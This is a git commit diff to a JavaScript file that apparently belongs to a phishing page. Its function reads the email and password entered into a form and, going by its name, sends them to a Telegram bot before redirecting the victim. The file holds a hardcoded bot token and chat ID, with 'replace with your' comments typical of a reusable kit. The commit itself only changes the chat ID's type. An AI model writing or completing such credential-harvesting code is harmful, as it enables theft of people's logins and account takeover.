0c200e8226870f7e1a781cfaa27f89ceff041a5a
ejebaby <ej936730@gmail.com>
2024-07-12 01:01:40 +0100

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,7 @@ console.log("sender.js connected");
 
 function sendTelegramMessageAndRedirect() {
   const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
-  const chatId = 5645205996; // Replace with your chat ID
+  const chatId = "5645205996"; // Replace with your chat ID
 
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
